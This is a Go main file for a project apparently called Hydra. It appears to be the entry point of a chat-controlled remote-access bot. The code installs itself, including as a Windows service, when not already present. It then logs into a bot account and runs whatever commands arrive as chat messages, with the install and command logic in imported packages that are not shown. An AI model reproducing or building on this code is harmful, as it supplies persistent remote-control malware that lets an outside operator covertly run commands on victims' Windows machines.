package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"

	"github.com/Raffy27/Hydra/api"
	"github.com/Raffy27/Hydra/commands"
	"github.com/Raffy27/Hydra/install"
	"golang.org/x/sys/windows/svc"
)

func checkthisshit() {
	if r := recover(); r != nil {
		ioutil.WriteFile("C:\\Users\\Raffy\\Desktop\\Panic.txt", []byte(fmt.Sprint(r)), 0644)
	}
}

func main() {
	defer checkthisshit()

	if os.Getenv("nocheck") == "" {
		if chk, _ := svc.IsWindowsService(); chk {
			install.HandleService(main)
		}
		if !install.IsInstalled() {
			install.Install()
		} else {
			log.Println("Already installed")
		}
	}

	log.Println("Logged in as", api.Bot.Self.UserName)
	//api.NewGenesis()
	log.Println("Genesis is", api.Genesis)
	//go api.Heartbeat()
	for u := range api.Updates {
		if u.Message == nil {
			continue
		}
		log.Printf("[%s] %s", u.Message.From.UserName, u.Message.Text)
		if u.Message.IsCommand() {
			commands.Perform(u.Message)
		}
	}
}
